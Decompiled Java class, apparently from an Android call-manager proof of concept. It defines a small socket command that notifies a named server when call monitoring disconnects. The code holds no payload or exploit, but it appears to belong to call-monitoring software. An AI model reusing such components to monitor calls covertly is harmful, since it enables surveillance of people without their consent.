package com.vvt.callmanager.ref.command;

import com.fx.socket.SocketCmd;
import com.vvt.callmanager.ref.MonitorDisconnectData;

public class RemoteNotifyOnMonitorDisconnect
  extends SocketCmd
{
  private static final long serialVersionUID = -4584603220506773713L;
  private String mServerName;
  
  public RemoteNotifyOnMonitorDisconnect(MonitorDisconnectData paramMonitorDisconnectData, String paramString)
  {
    super(paramMonitorDisconnectData, Boolean.class);
    this.mServerName = paramString;
  }
  
  protected String getServerName()
  {
    return this.mServerName;
  }
  
  protected String getTag()
  {
    return "RemoteNotifyOnMonitorDisconnect";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/ref/command/RemoteNotifyOnMonitorDisconnect.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */